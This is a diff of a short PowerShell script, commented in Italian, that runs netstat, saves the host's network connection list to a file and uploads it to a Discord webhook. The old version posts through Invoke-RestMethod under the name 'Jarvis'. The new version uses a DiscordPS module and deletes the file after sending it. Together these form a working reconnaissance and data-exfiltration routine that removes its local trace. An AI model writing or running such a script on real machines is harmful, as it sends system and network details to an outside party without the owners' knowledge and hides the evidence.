@@ -1,23 +1,21 @@
-# Imposta le variabili
-$command = "netstat"
-$message = "Risultato del comando: $command"
-$fileName = "netstat.txt"
+# Imposta il percorso del file in cui salvare l'output di netstat
+$filePath = Join-Path $PSScriptRoot "netstat_output.txt"
 
-# Esegue il comando
-$output = Invoke-Expression $command
+# Esegue il comando netstat e salva l'output nel file specificato
+netstat > $filePath
 
-# Salva il risultato in un file txt
-$output | Out-File $fileName
+# Carica il modulo DiscordPS
+Import-Module DiscordPS
 
-$fileBytes = [System.IO.File]::ReadAllBytes($fileName)
-
-$payload = @{
-    'username' = 'Jarvis'
-    'content' = 'File allegato: $fileName'
-    'file' = $fileBytes
+# Crea il messaggio Discord
+$messageParams = @{
+    Webhook = $webhook
+    Content = "Output di netstat:"
+    File = $filePath
 }
 
-$payloadString = $payload | ConvertTo-Json
+# Invia il file come allegato
+Send-DiscordMessage @messageParams
 
-# Invia il file tramite Discord
-Invoke-RestMethod -ContentType 'application/json' -Method POST -Uri $webhook -Body $payloadString
+# Elimina il file dopo l'invio (se necessario)
+Remove-Item $filePath
